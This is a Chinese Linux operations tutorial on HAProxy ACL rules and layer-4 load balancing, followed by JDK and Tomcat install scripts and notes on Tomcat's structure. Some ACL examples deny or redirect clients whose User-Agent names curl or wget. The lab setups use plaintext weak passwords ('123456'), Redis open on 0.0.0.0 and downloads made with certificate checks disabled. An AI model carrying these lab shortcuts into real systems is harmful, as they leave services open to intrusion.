访问控制列表（ACL，Access Control Lists）是一种基于包过滤的访问控制技术，它可以根据设定的条件对经过服务器传输的数据包进行过滤(条件匹配)，即对接收到的报文进行匹配和过滤，基于请求报文头部中的源地址、源端口、目标地址、目标端口、请求方法、URL、文件后缀等信息内容进行匹配并执行进一步操作，比如允许其通过或丢弃。(比如实现动静分离)

**官方帮助**

```
http://cbonte.github.io/haproxy-dconv/2.1/configuration.html#7
http://cbonte.github.io/haproxy-dconv/2.0/configuration.html#7
```

##### 43.4.8.1 ACL配置

```
#1.ACL配置
acl   <aclname> <criterion>   [flags]     [operator]   [<value>]
acl     名称     匹配规范     匹配模式     具体操作符     操作对象类型




#2.ACL-criterion
定义ACL匹配规范，即：判断条件
hdr string，提取在一个HTTP请求报文的首部
hdr（[<name> [，<occ>]]）：完全匹配字符串,header的指定信息，<occ> 表示在多值中使用的值的出现次数
hdr_beg（[<name> [，<occ>]]）：前缀匹配，header中指定匹配内容的begin
hdr_end（[<name> [，<occ>]]）：后缀匹配，header中指定匹配内容end
hdr_dom（[<name> [，<occ>]]）：域匹配，header中的domain name
hdr_dir（[<name> [，<occ>]]）：路径匹配，header的uri路径
hdr_len（[<name> [，<occ>]]）：长度匹配，header的长度匹配
hdr_reg（[<name> [，<occ>]]）：正则表达式匹配，自定义表达式(regex)模糊匹配
hdr_sub（[<name> [，<occ>]]）：子串匹配，header中的uri模糊匹配


#示例：
hdr(<string>) 用于测试请求头部首部指定内容
hdr_dom(host) 请求的host名称，如 www.liusenbiao.com  m.liusenbiao.com
hdr_beg(host) 请求的host开头，如 www.   img.   video.   download.   ftp.
hdr_end(host) 请求的host结尾，如 .com   .net   .cn 

#示例：
acl bad_agent hdr_sub(User-Agent) -i curl wget
block if bad_agent

#有些功能是类似的，比如以下几个都是匹配用户请求报文中host的开头是不是www
acl short_form hdr_beg(host)       www.
acl alternate1 hdr_beg(host) -m beg www.
acl alternate2 hdr_dom(host) -m beg www.
acl alternate3 hdr(host)     -m beg www.


base : string
base = <host>:<port>/<path>;<params>
#返回第一个主机头和请求的路径部分的连接，该请求从主机名开始，并在问号之前结束,对虚拟主机有用
<scheme>://<user>:<password>@#<host>:<port>/<path>;<params>#?<query>#<frag>
 base     : exact string match
 base_beg : prefix match
 base_dir : subdir match
 base_dom : domain match
 base_end : suffix match
 base_len : length match
 base_reg : regex match
 base_sub : substring match
 
 
 
path : string
#提取请求的URL路径，该路径从第一个斜杠开始，并在问号之前结束（无主机部分）
<scheme>://<user>:<password>@<host>:<port>#/<path>;<params>#?<query>#<frag>
 path     : exact string match
 path_beg : prefix match  #请求的URL开头，如/static、/images、/img、/css
 path_end : suffix match  #请求的URL中资源的结尾，如 .gif .png .css .js .jpg 
.jpeg
 path_dom : domain match
 path_dir : subdir match
 path_len : length match
 path_reg : regex match
 path_sub : substring match
 
#示例：
 path_beg -i /haproxy-status/ 
 path_end .jpg .jpeg .png .gif 
 path_reg ^/images.*\.jpeg$ 
 path_sub image
 path_dir jpegs 
 path_dom magedu
 
 
 
url : string
#提取请求中的整个URL。一个典型的应用是具有预取能力的缓存，以及需要从数据库聚合多个信息并将它们保
存在缓存中的网页门户入口，推荐使用path
 url ：exact string match
 url_beg : prefix match
 url_dir : subdir match
 url_dom : domain match
 url_end : suffix match
 url_len : length match
 url_reg : regex match
 url_sub : substring match
 
dst #目标IP
dst_port #目标PORT

src   #源IP
src_port #源PORT

#示例：
acl invalid_src src 10.0.0.7 192.168.1.0/24
acl invalid_src src 172.16.0.0/24
acl invalid_port src_port 0:1023
status : integer  #返回在响应报文中的状态码

#七层协议
acl valid_method method GET HEAD
http-request deny if ! valid_method



#3.ACL-flags
ACL匹配模式
-i 不区分大小写
-m 使用指定的pattern匹配方法
-n 不做DNS解析
-u 禁止acl重名，否则多个同名ACL匹配或关系



#4.ACL-operator
ACL 操作符
整数比较：eq、ge、gt、le、lt
字符比较：
- exact match     (-m str) :字符串必须完全匹配模式
- substring match (-m sub) :在提取的字符串中查找模式，如果其中任何一个被发现，ACL将匹配
- prefix match   (-m beg) :在提取的字符串首部中查找模式，如果其中任何一个被发现，ACL将匹配
- suffix match   (-m end) :将模式与提取字符串的尾部进行比较，如果其中任何一个匹配，则ACL进行匹配
- subdir match   (-m dir) :查看提取出来的用斜线分隔（“/"）的字符串，如其中任一个匹配，则ACL进行匹配
- domain match   (-m dom) :查找提取的用点（“."）分隔字符串，如果其中任何一个匹配，则ACL进行匹配



#5.ACL-value
value的类型
The ACL engine can match these types against patterns of the following types :
- Boolean #布尔值
- integer or integer range #整数或整数范围，比如用于匹配端口范围
- IP address / network #IP地址或IP范围, 192.168.0.1 ,192.168.0.1/24
- string--> www.magedu.com
 exact –精确比较
 substring—子串
 suffix-后缀比较
 prefix-前缀比较
 subdir-路径， /wp-includes/js/jquery/jquery.js
 domain-域名，www.magedu.com
- regular expression #正则表达式
- hex block #16进制
```

##### 43.4.8.2 ACL-域名匹配

```
#1.目标
做到访问www.liusenbiao.org调度到10.0.0.18上，访问m.liusenbiao.org调度到10.0.0.28上。



#2.做域名解析
#10.0.0.7机器上
[18:52:39 root@centos7 ~]# vim /etc/hosts
10.0.0.17 www.liusenbiao.org m.liusenbiao.org



#3.设置haproxy的配置文件
[root@haproxy ~]# vim /etc/haproxy/conf.d/test.cfg
frontend liu_web_80
   bind 10.0.0.17:80
###################### acl setting ###############################
   acl pc_domain hdr_dom(host)      -i www.liusenbiao.org
   acl mobile_domain hdr_dom(host)  -i m.liusenbiao.org
###################### acl hosts #################################
   use_backend pc_hosts        if pc_domain
   use_backend mobile_hosts    if mobile_domain
   default_backend pc_hosts
###################### backend hosts #############################

backend pc_hosts
   server rs1 10.0.0.18:80 check

backend mobile_hosts
   server rs2 10.0.0.28:80 check
[root@haproxy ~]# systemctl restart haproxy



#10.0.0.7机器上测试
[19:32:42 root@centos7 ~]#curl www.liusenbiao.org
this is rs1 10.0.0.18
[20:37:58 root@centos7 ~]#curl www.liusenbiao.org
this is rs1 10.0.0.18
[20:37:59 root@centos7 ~]#curl www.liusenbiao.org
this is rs1 10.0.0.18
[20:38:01 root@centos7 ~]#curl www.liusenbiao.org
this is rs1 10.0.0.18
[20:38:02 root@centos7 ~]#curl m.liusenbiao.org
this is rs2 10.0.0.28
[20:38:10 root@centos7 ~]#curl m.liusenbiao.org
this is rs2 10.0.0.28
[20:38:12 root@centos7 ~]#curl m.liusenbiao.org
this is rs2 10.0.0.28
```

##### 43.4.8.3  ACL-基于源IP或子网调度访问

```
将指定的源地址调度至指定的web服务器组。
#1.设置haproxy的配置文件
[root@haproxy ~]# vim /etc/haproxy/conf.d/test.cfg
frontend liu_web_80
   bind 10.0.0.17:80
###################### acl setting ###############################
   acl pc_domain hdr_dom(host)      -i www.liusenbiao.org
   acl mobile_domain hdr_dom(host)  -i m.liusenbiao.org
   acl ip_range_test src 172.18.0.0/16 10.0.0.6  #定义网段
   acl ip_range_test2 src 172.18.0.200   #定义具体ip
###################### acl hosts #################################
   use_backend pc_hosts        if ip_range_test  #放在前面的ACL规则优先生效
   use_backend mobile_hosts    if ！ip_range_test
   use_backend pc_hosts        if pc_domain  
   use_backend mobile_hosts    if mobile_domain
   default_backend pc_hosts
###################### backend hosts #############################

backend pc_hosts
   server rs1 10.0.0.18:80 check

backend mobile_hosts
   server rs2 10.0.0.28:80 check
[root@haproxy ~]# systemctl restart haproxy
```

##### 43.4.8.4  ACL-基于源地址的访问控制

```
拒绝指定IP或者IP范围访问

#1.设置haproxy的配置文件
[root@haproxy ~]# vim /etc/haproxy/conf.d/test.cfg
frontend liu_web_80
   bind 10.0.0.17:80
   balance roundrobin
###################### acl setting ###############################
   acl pc_domain hdr_dom(host)      -i www.liusenbiao.org
   acl mobile_domain hdr_dom(host)  -i m.liusenbiao.org
   acl ip_range_test src 172.18.0.0/16 10.0.0.6  #定义网段
   acl ip_range_test2 src 172.18.0.200   #定义具体ip
###################### acl hosts #################################
   use_backend pc_hosts        if ip_range_test  #放在前面的ACL规则优先生效
   http-request deny           if ！ip_range_test  #访问拒绝
   use_backend pc_hosts        if pc_domain  
   use_backend mobile_hosts    if mobile_domain
   default_backend pc_hosts
###################### backend hosts #############################

backend pc_hosts
   server rs1 10.0.0.18:80 check

backend mobile_hosts
   server rs2 10.0.0.28:80 check
[root@haproxy ~]# systemctl restart haproxy
```

##### 43.4.8.5  ACL-匹配浏览器类型

```
匹配客户端浏览器，将不同类型的浏览器调动至不同的服务器组
范例: 163 网易拒绝curl和wget的访问

#1.设置haproxy的配置文件
[root@haproxy ~]# vim /etc/haproxy/conf.d/test.cfg
frontend liu_web_80
   bind 10.0.0.17:80
   balance roundrobin
###################### acl setting ###############################
   acl acl_user_agent    hdr_sub(User-Agent)  -i curl wget   #基于浏览器的ACL
   acl acl_user_agent_ab hdr_sub(User-Agent)  -i ApacheBench
###################### acl hosts #################################
   redirect prefix       http://www.baidu.com if acl_user_agent   #302 临时重定向至新URL
   http-request deny     if acl_user_agent_ab   #拒绝ab
###################### backend hosts #############################
backend pc_hosts
   server rs1 10.0.0.18:80 check

backend mobile_hosts
   server rs2 10.0.0.28:80 check
[root@haproxy ~]# systemctl restart haproxy




#2.测试
[root@centos6 ~]#curl -I 10.0.0.7
HTTP/1.1 302 Found
content-length: 0
location: http://10.0.0.8/
cache-control: no-cache
[root@centos6 ~]#curl -L 10.0.0.7
10.0.0.8
[root@centos6 ~]# wget -qO - http://10.0.0.7
#-qO -模拟浏览器进行访问
10.0.0.8
[root@centos6 ~]#curl -A chrome http://10.0.0.7
10.0.0.27

#模拟ab
[root@centos6 ~]#curl -A ApacheBench 10.0.0.7
#-A模拟指定的浏览器
<html><body><h1>403 Forbidden</h1>
Request forbidden by administrative rules.
</body></html>
```

##### 43.4.8.6  ACL-实现动静分离

```
#1.设置haproxy的配置文件
[root@haproxy ~]# vim /etc/haproxy/conf.d/test.cfg
frontend liu_web_80
   bind 10.0.0.17:80
   balance roundrobin
###################### acl setting ###############################
   acl acl_static path_end -i .jpg .jpeg .png .gif .css .js .html  #基于文件后缀名的ACL
   acl acl_static path_end -i  /static /images  #ACL同名为或关系
   acl acl_app    path_beg -i  /api
###################### acl hosts #################################
   use_backend mobile_hosts if acl_static
   use_backend pc_hosts if acl_app
###################### backend hosts #############################
backend pc_hosts
   server rs1 10.0.0.18:80 check

backend mobile_hosts
   server rs2 10.0.0.28:80 check
[root@haproxy ~]# systemctl restart haproxy
```

##### 43.4.8.7  ACL-自定义HAProxy错误界面

![1657200753550](linux体系.assets/1657200753550.png)

```
#1.概述
对指定的报错进行重定向，进行优雅的显示错误页面
使用errorfile和errorloc指令的两种方法，可以实现自定义各种错误页面




#2.自定义错误页
errorfile <code> <file> 
<code> #HTTP status code.支持200, 400, 403, 405, 408, 425, 429, 500, 502，503,504
<file> #包含完整HTTP响应头的错误页文件的绝对路径。 建议后缀".http"，以和一般的html文件相区分

#示例：
errorfile 400 /etc/haproxy/errorfiles/400badreq.http
errorfile 403 /etc/haproxy/errorfiles/403forbid.http
errorfile 503 /etc/haproxy/errorfiles/503sorry.http




#3.案例

#3.1编写自定义html页面
[root@haproxy ~]# mkdir /etc/haproxy/errorfiles/
[root@haproxy ~]# vim /etc/haproxy/errorfiles/503sorry.http
HTTP/1.1 503 Service Unavailable
Content-Type:text/html;charset=utf-8

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>报错页面</title>
</head>
<body>
<center><h1>网站维护中......请稍候再试</h1></center>
<center><h2>联系人：刘大大@qq.com</h2></center>
<center><h3>503 Service Unavailable</h3></center>
</body>


#3.2配置主配置之文件中defaults语句块
[root@haproxy ~]# vim /etc/haproxy/haproxy.cfg
global
    maxconn 100000
    chroot /apps/haproxy
    #stats socket /var/lib/haproxy/haproxy.sock mode 600 level admin
    stats socket /var/lib/haproxy/haproxy.sock1 mode 600 level admin process 1
    stats socket /var/lib/haproxy/haproxy.sock2 mode 600 level admin process 2
    #uid 99
    #gid 99
    user haproxy
    group haproxy
    daemon
    nbproc 2

    cpu-map 1 0
    cpu-map 2 1
    pidfile /var/lib/haproxy/haproxy.pid
    log 127.0.0.1 local2 info
    log 10.0.0.18 local6 info

defaults
   option http-keep-alive
   option forwardfor
   maxconn 100000
   mode http
   timeout connect 300000ms
   timeout client 300000ms
   timeout server 300000ms
   errorfile 503 /etc/haproxy/errorfiles/503sorry.http #自定义错误页面
   errorloc 503 http://www.liusenbiao.com/    #重定向到首页
listen stats
   mode http
   bind 0.0.0.0:9999
   stats enable
   log global
   stats uri    /haproxy-status
   stats auth   haadmin:123456
[root@haproxy ~]# systemctl restart haproxy
```

![1657201810139](linux体系.assets/1657201810139.png)

#### 43.4.9  HAProxy四层负载 

针对除HTTP以外的TCP协议应用服务访问的应用场景

```
MySQL
Redis
Memcache
RabbitMQ
```

**注意：如果使用frontend和backend，一定在 frontend 和 backend 段中都指定mode tcp** 

```
listen redis-port
   bind 10.0.0.7:6379
   mode tcp
   balance leastconn
   server server1 10.0.0.17:6379 check
   server server2 10.0.0.27:6379 check backup
```

**范例：对 MySQL 服务实现四层负载**

**haproxy**

```
[root@haproxy ~]# vim /etc/haproxy/conf.d/test.cfg
listen liu_redis_6379
      bind 10.0.0.17:6379
      mode tcp
      server redis1 10.0.0.18:6379 check
      server redis2 10.0.0.28:6379 check

frontend liu_mysql_3306
      bind 10.0.0.17:3306
      mode tcp
      default_backend liu_mysql_backend

backend liu_mysql_backend
       mode tcp
       server mysql1 10.0.0.18:3306 check
       server mysql2 10.0.0.28:3306 check
[root@haproxy ~]# systemctl restart haproxy
```

**rs{1,2}**

```
#1.安装包
[root@rs2 ~]# yum -y install mysql-server redis
[root@rs2 ~]# systemctl enable --now mysqld redis



#2.修改redis允许远程访问
[root@rs2 ~]# vim /etc/redis.conf
bind 0.0.0.0  #69行改成0.0.0.0



#3.修改mysql允许远程访问
[root@rs2 ~]# mysql -e "create user test1@'10.0.0.%' identified by '123456'"
```

**10.0.0.7客户端**

```
[23:05:23 root@centos7 ~]#mysql -utest1 -p123456 -h10.0.0.17 -e 'select @@hostname'
+------------+
| @@hostname |
+------------+
| rs2        |
+------------+
[23:05:23 root@centos7 ~]#mysql -utest1 -p123456 -h10.0.0.17 -e 'select @@hostname'
+------------+
| @@hostname |
+------------+
| rs1        |
+------------+
```

![1657206849565](linux体系.assets/1657206849565.png)

## 44. 企业级TOMCAT

### 44.1 安装 JDK

```
#1.各种系统yum安装
#centos
[root@centos7 ~]# yum -y install java-1.8.0-openjdk.x86_64 java-1.8.0-openjdk-devel
[root@centos7 ~]# java -version
openjdk version "1.8.0_262"
OpenJDK Runtime Environment (build 1.8.0_262-b10)
OpenJDK 64-Bit Server VM (build 25.262-b10, mixed mode)


#ubuntu
[root@ubuntu1804 ~]# sudo apt -y install openjdk-8-jdk
[root@ubuntu1804 ~]#java -version
openjdk version "1.8.0_242"
OpenJDK Runtime Environment (build 1.8.0_242-8u242-b08-0ubuntu3~18.04-b08)
OpenJDK 64-Bit Server VM (build 25.242-b08, mixed mode)






#2.编译运行java程序
[root@centos8 ~]#dnf -y install java-1.8.0-openjdk-devel
[root@centos8 ~]#cat Hello.java
class Hello{  
   public static void main(String[] args)
   {  
       System.out.println("hello, world");  
   }  
}  

#编译成字节码
[root@centos8 ~]#javac Hello.java 
[root@centos8 ~]#ll Hello.*
-rw-r--r-- 1 root root 416 Oct 24 13:00 Hello.class
-rw-r--r-- 1 root root 130 Aug 22 23:38 Hello.java

[root@centos8 ~]#file Hello.class 
Hello.class: compiled Java class data, version 52.0 (Java 1.8)

#运行java程序
[root@centos8 ~]#java Hello 
hello, world





#3.安装oracle官方JDK

#3.1 Oracle JDK的rpm安装
#需要登录下载：https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html
[root@centos7 ~]# ll
-rw-r--r--  1 root root 114063112 Sep  1  2021 jdk-8u291-linux-x64.rpm

#安装jdk，无相关依赖包
[root@centos7 ~]# yum -y install jdk-8u291-linux-x64.rpm

#初始化环境变量
[root@centos7 ~]# vim /etc/profile.d/jdk.sh
export JAVA_HOME=/usr/java/default
export PATH=$JAVA_HOME/bin:$PATH
[root@centos7 ~]# source /etc/profile.d/jdk.sh




#3.2 Oracle JDK的二进制文件一键安装脚本
[root@centos8 ~]# vim install_jdk.sh
#!/bin/bash
#      
#********************************************************************
#Author:         liusenbiao
#Date:           2022-07-05
#FileName：      install_jdk.sh
#Description：   在线一键安装二进制JDK
#********************************************************************
DIR=`pwd`
JDK_URL=http://liusenbiao.cn/download
JDK_FILE="jdk-8u291-linux-x64.tar.gz"
JDK_DIR="/usr/local"


rpm -q wget || yum -y -q install wget
color() {
    RES_COL=60
    MOVE_TO_COL="echo -en \\033[${RES_COL}G"
    SETCOLOR_SUCCESS="echo -en \\033[1;32m"
    SETCOLOR_FAILURE="echo -en \\033[1;31m"
    SETCOLOR_WARNING="echo -en \\033[1;33m"
    SETCOLOR_NORMAL="echo -en \E[0m"
    echo -n "$2" && $MOVE_TO_COL
    echo -n "["
    if [ $1 = "success" -o $1 = "0" ];then
       ${SETCOLOR_SUCCESS}
       echo -n $"  OK  "
    elif [ $1 = "failure" -o $1 = "1" ];then
       ${SETCOLOR_FAILURE}
       echo -n $"  FAILURE  "
    else
       ${SETCOLOR_WARNING}
       echo -n $"  WARNING  "
    fi
    ${SETCOLOR_NORMAL}
    echo -n "]"
    echo
}

install_jdk() {
wget $JDK_URL/$JDK_FILE
if ! [ -f "$DIR/$JDK_FILE" ];then
   color 1 "$JDK_FILE 文件不存在"
   exit;
elif [ -d $JDK_DIR/jdk ];then
   color 1 "JDK 已经安装"
   exit
else
   [ -d "JDK_DIR" ] || mkdir -pv $JDK_DIR
  fi
tar xvf $DIR/$JDK_FILE -C $JDK_DIR
cd $JDK_DIR && ln -s jdk1.8.* jdk

cat > /etc/profile.d/jdk.sh <<EOF
export JAVA_HOME=$JDK_DIR/jdk
export JRE_HOME=\$JAVA_HOME/jre
export CLASSPATH=\$JAVA_HOME/lib/:\$JRE_HOME/lib/
export PATH=\$PATH:\$JAVA_HOME/bin
EOF
source /etc/profile.d/jdk.sh
java -version && color 0  "JDK 安装完成" || { color 1 "JDK 安装失败"; exit; }

}


install_jdk

#要先退出一下再java -version
[root@centos8 ~]# exit
[root@centos8 ~]# java -version
java version "1.8.0_291"
Java(TM) SE Runtime Environment (build 1.8.0_291-b10)
Java HotSpot(TM) 64-Bit Server VM (build 25.291-b10, mixed mode)
```

![1657251779615](linux体系.assets/1657251779615.png)

### 44.2 安装tomcat

#### 44.2.1 基于包安装

```
#centos
[root@centos7 ~]# yum -y install tomcat tomcat-webapps tomcat-admin-webapps tomcat-docs-webapp
[root@centos7 ~]#systemctl enable --now tomcat


#ubuntu
[root@ubuntu1804 ~]# sudo apt -y install tomcat8 tomcat8-admin tomcat8-docs
```

![1657253239765](linux体系.assets/1657253239765.png)

#### 44.2.2 二进制一键安装脚本

```
注意: 安装tomcat 前必须先部署JDK
官方和镜像站点下载:
https://tomcat.apache.org/download-80.cgi
https://mirrors.tuna.tsinghua.edu.cn/apache/tomcat/
[root@centos7 ~]# vim install_tomcat.sh
#!/bin/bash
#      
#********************************************************************
#Author:        liusenbiao
#Date:          2022-07-05
#FileName：      install_tomcat.sh
#Description：  在线一键安装二进制JDK+二进制Tomcat
#********************************************************************

DIR=`pwd`
JDK_URL=http://liusenbiao.cn/download/tars/java
JDK_FILE="jdk-8u291-linux-x64.tar.gz"
TOMCAT_FILE="apache-tomcat-8.5.81.tar.gz"
JDK_DIR="/usr/local"
TOMCAT_DIR="/usr/local"
TCOMCAT_URL=https://mirrors.tuna.tsinghua.edu.cn/apache/tomcat/tomcat-8/v8.5.81/bin
TOMCAT_TAR=apache-tomcat-8.5.81.tar.gz

rpm -q wget &> /dev/null || yum -y -q install wget
color () {
    RES_COL=60
    MOVE_TO_COL="echo -en \\033[${RES_COL}G"
    SETCOLOR_SUCCESS="echo -en \\033[1;32m"
    SETCOLOR_FAILURE="echo -en \\033[1;31m"
    SETCOLOR_WARNING="echo -en \\033[1;33m"
    SETCOLOR_NORMAL="echo -en \E[0m"
    echo -n "$2" && $MOVE_TO_COL
    echo -n "["
    if [ $1 = "success" -o $1 = "0" ] ;then
        ${SETCOLOR_SUCCESS}
        echo -n $"  OK  "    
    elif [ $1 = "failure" -o $1 = "1"  ] ;then
        ${SETCOLOR_FAILURE}
        echo -n $"FAILED"
    else
        ${SETCOLOR_WARNING}
        echo -n $"WARNING"
    fi
    ${SETCOLOR_NORMAL}
    echo -n "]"
    echo                                                                                                                              
}


install_jdk(){
wget $TCOMCAT_URL/$TOMCAT_TAR --no-check-certificate
wget $JDK_URL/$JDK_FILE
if !  [  -f "$DIR/$JDK_FILE" ];then
    color 1 "$JDK_FILE 文件不存在" 
    exit; 
elif [ -d $JDK_DIR/jdk ];then
    color 1  "JDK 已经安装" 
    exit
else 
    [ -d "$JDK_DIR" ] || mkdir -pv $JDK_DIR
fi
tar xvf $DIR/$JDK_FILE  -C $JDK_DIR
cd  $JDK_DIR && ln -s jdk1.8.* jdk 

cat >  /etc/profile.d/jdk.sh <<EOF
export JAVA_HOME=$JDK_DIR/jdk
export JRE_HOME=\$JAVA_HOME/jre
export CLASSPATH=\$JAVA_HOME/lib/:\$JRE_HOME/lib/
export PATH=\$PATH:\$JAVA_HOME/bin
EOF
.  /etc/profile.d/jdk.sh
java -version && color 0 "JDK 安装完成" || { color 1  "JDK 安装失败" ; exit; }

}

install_tomcat(){
if ! [ -f "$DIR/$TOMCAT_FILE" ];then
    color 1 "$TOMCAT_FILE 文件不存在" 
    exit; 
elif [ -d $TOMCAT_DIR/tomcat ];then
    color 1 "TOMCAT 已经安装" 
    exit
else 
    [ -d "$TOMCAT_DIR" ] || mkdir -pv $TOMCAT_DIR
fi
tar xf $DIR/$TOMCAT_FILE -C $TOMCAT_DIR
cd  $TOMCAT_DIR && ln -s apache-tomcat-*/  tomcat
echo "PATH=$TOMCAT_DIR/tomcat/bin:"'$PATH' > /etc/profile.d/tomcat.sh
id tomcat &> /dev/null || useradd -r -s /sbin/nologin tomcat

cat > $TOMCAT_DIR/tomcat/conf/tomcat.conf <<EOF
JAVA_HOME=$JDK_DIR/jdk
EOF

chown -R tomcat.tomcat $TOMCAT_DIR/tomcat/

cat > /lib/systemd/system/tomcat.service  <<EOF
[Unit]
Description=Tomcat
#After=syslog.target network.target remote-fs.target nss-lookup.target
After=syslog.target network.target 

[Service]
Type=forking
EnvironmentFile=$TOMCAT_DIR/tomcat/conf/tomcat.conf
ExecStart=$TOMCAT_DIR/tomcat/bin/startup.sh
ExecStop=$TOMCAT_DIR/tomcat/bin/shutdown.sh
RestartSec=3
PrivateTmp=true
User=tomcat
Group=tomcat

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable --now tomcat.service &> /dev/null
systemctl is-active tomcat.service &> /dev/null &&  color 0 "TOMCAT 安装完成" || { color 1 "TOMCAT 安装失败" ; exit; }

}

install_jdk 

install_tomcat


#安装完成后退出exit才能使用startup.sh
```

![1657280324333](linux体系.assets/1657280324333.png)

### 44.3 tomcat的文件结构和组成

#### 44.3.1 目录结构

| 目录    | 说明                                  |
| ------- | ------------------------------------- |
| bin     | 服务启动、停止等相关程序和文件        |
| conf    | 配置文件                              |
| lib     | 库目录                                |
| logs    | 日志目录                              |
| webapps | 应用程序，应用部署目录                |
| work    | jsp编译后的结果文件，建议提前预热访问 |

```
#生产中上线java程序的时候会遇到一个坑，比如一个程序是java 1.0版本要升级成java 2.0版本，源代码已经更新了，可看到的还是以前的老版本，究极原因就是jsp文件夹里面存放的是原先老版本的编译完成的java程序，jsp文件夹可以理解成一个缓存，删除里面的文件即可完成版本的升级。

[root@pxc2 ~]# tree /usr/local/tomcat/work/
/usr/local/tomcat/work/
└── Catalina
    └── localhost
        ├── docs
        ├── examples
        ├── host-manager
        ├── manager
        └── ROOT
            └── org
                └── apache
                    └── jsp
                        ├── index_jsp.class
                        └── index_jsp.java

10 directories, 2 files
```

#### 44.3.2 配置文件

##### 44.3.2.1 配置文件说明

官方帮助文档：http://tomcat.apache.org/tomcat-8.5-doc/index.html

在tomcat安装目录下的 conf 子目录中，有以下的 tomcat 的配置文件

| 文件名              | 说明                                                         |
| ------------------- | ------------------------------------------------------------ |
| **server.xml**      | 主配置文件                                                   |
| **web.xml**         | 每个webapp只有“部署”后才能被访问，它的部署方式通常由web.xml进 行定义，其存放位置为WEB-INF/目录中；此文件为所有的webapps提供 默认部署相关的配置,每个web应用也可以使用专用配置文件,来覆盖全局文件 |
| **context.xml**     | 用于定义所有web应用均需加载的Context配置，此文件为所有的 webapps提供默认配置，每个web应用也可以使用自已专用的配置，它通 常由专用的配置文件context.xml来定义，其存放位置为WEB-INF/目录中, 覆盖全局的文件 |
| tomcat-users.xml    | 用户认证的账号和密码文件                                     |
| catalina.policy     | 当使用security选项启动tomcat时，用于为tomcat设置安全策略     |
| catalina.properties | Tomcat 环境变量的配置，用于设定类加载器路径，以及一些与JVM调优相关参数 |
| logging.properties  | Tomcat 日志系统相关的配置，可以修改日志级别和日志路径等      |

##### 44.3.2.2 日志文件

```
#1.参考文档
参考文档: https://cwiki.apache.org/confluence/display/TOMCAT/Logging
日志格式: https://tomcat.apache.org/tomcat-9.0-doc/config/valve.html#Access_Logging

%a - Remote IP address
%A - Local IP address
%b - Bytes sent, excluding HTTP headers, or '-' if zero
%B - Bytes sent, excluding HTTP headers
%h - Remote host name (or IP address if enableLookups for the connector is false)
%H - Request protocol
%l - Remote logical username from identd (always returns '-')
%m - Request method (GET, POST, etc.)
%p - Local port on which this request was received. See also %{xxx}p below.
%q - Query string (prepended with a '?' if it exists)
%r - First line of the request (method and request URI)
%s - HTTP status code of the response
%S - User session ID
%t - Date and time, in Common Log Format
%u - Remote user that was authenticated (if any), else '-'
%U - Requested URL path
%v - Local server name
%D - Time taken to process the request in millis. Note: In httpd %D is 
microseconds. Behaviour will be aligned to httpd in Tomcat 10 onwards.
%T - Time taken to process the request, in seconds. Note: This value has 
millisecond resolution whereas in httpd it has second resolution. Behaviour will 
be align to httpd in Tomcat 10 onwards.
%F - Time taken to commit the response, in millis
%I - Current request thread name (can compare later with stacktraces)
%X - Connection status when response is completed:
X = Connection aborted before the response completed.
+ = Connection may be kept alive after the response is sent.
- = Connection will be closed after the response is sent.
There is also support to write information incoming or outgoing headers, cookies, session or request attributes and special timestamp formats. It is modeled after the Apache HTTP Server log configuration syntax. Each of them can be used multiple times with different xxx keys:
%{xxx}i write value of incoming header with name xxx
%{xxx}o write value of outgoing header with name xxx
%{xxx}c write value of cookie with name xxx
%{xxx}r write value of ServletRequest attribute with name xxx
%{xxx}s write value of HttpSession attribute with name xxx
%{xxx}p write local (server) port (xxx==local) or remote (client) port (xxx=remote)
%{xxx}t write timestamp at the end of the request formatted using the enhanced SimpleDateFormat pattern xxx




#2.日志存放路径
[root@pxc2 ~]# tail /usr/local/tomcat/logs/localhost_access_log.2022-07-08.txt -f
10.0.0.1 - - [08/Jul/2022:20:34:52 +0800] "GET / HTTP/1.1" 200 11230
10.0.0.1 - - [08/Jul/2022:20:34:57 +0800] "GET / HTTP/1.1" 200 11230




#3.修改日志格式
[root@pxc2 ~]# vim /usr/local/tomcat/conf/server.xml
             Documentation at: /docs/config/valve.html
             Note: The pattern used is equivalent to using pattern="common" -->
       <Valve className="org.apache.catalina.valves.AccessLogValve"
directory="logs"
               prefix="localhost_access_log" suffix=".txt"
               pattern="%h %l %u %t &quot;%r&quot; %s %b" />   #说明: &quot;在
html中表示双引号"符号
     </Host>
   </Engine>
 </Service>
```

#### 44.3.3 组件

##### 44.3.3.1组件分层和分类

```
顶级组件
Server，代表整个Tomcat容器，一台主机可以启动多tomcat实例，需要确保端口不要产生冲突

服务类组件
Service，实现组织Engine和Connector，建立两者之间关联关系, service 里面只能包含一个Engine

连接器组件
Connector，有HTTP（默认端口8080/tcp）、HTTPS（默认端口8443/tcp）、AJP（默认端口8009/tcp）协议的连接器，AJP（Apache Jserv protocol）是一种基于TCP的二进制通讯协议。

容器类
Engine、Host（虚拟主机）、Context(上下文件,解决路径映射)都是容器类组件，可以嵌入其它组件，内部配置如何运行应用程序。

内嵌类
可以内嵌到其他组件内，valve、logger、realm、loader、manager等。以logger举例，在不同容器组件内分别定义。

集群类组件
listener、cluster
```

##### 44.3.3.2 Tomcat内部组成

![1657284744319](linux体系.assets/1657284744319.png)

| 名称      | 说明                                                         |
| --------- | ------------------------------------------------------------ |
| Server    | 服务器，Tomcat运行的进程实例，一个Server中可以有多个service，但通常就一个 |
| Service   | 服务，用来组织Engine和Connector的对应关系，一个service中只有一个Engine |
| Connector | 连接器，负责客户端的HTTP、HTTPS、AJP等协议连接。一个Connector只属于某 一个Engine |
| Engine    | 即引擎，用来响应并处理用户请求。一个Engine上可以绑定多个Connector |
| Host      | 即虚拟主机,可以实现多虚拟主机,例如使用不同的主机头区分       |
| Context   | 应用的上下文，配置特定url路径映射和目录的映射关系：url => directory |

##### 44.3.3.3 核心组件

```
#1.概述
Tomcat启动一个Server进程。可以启动多个Server，即tomcat的多实例, 但一般只启动一个

创建一个Service提供服务。可以创建多个Service，但一般也只创建一个
    每个Service中，是Engine和其连接器Connector的关联配置
    
可以为这个Service提供多个连接器Connector，这些Connector使用了不同的协议，绑定了不同的端口。其作用就是处理来自客户端的不同的连接请求或响应
   
Service 内部还定义了Engine，引擎才是真正的处理请求的入口，其内部定义多个虚拟主机Host
    Engine对请求头做了分析，将请求发送给相应的虚拟主机
    如果没有匹配，数据就发往Engine上的defaultHost缺省虚拟主机
    Engine上的缺省虚拟主机可以修改
    
Host 定义虚拟主机，虚拟主机有name名称，通过名称匹配
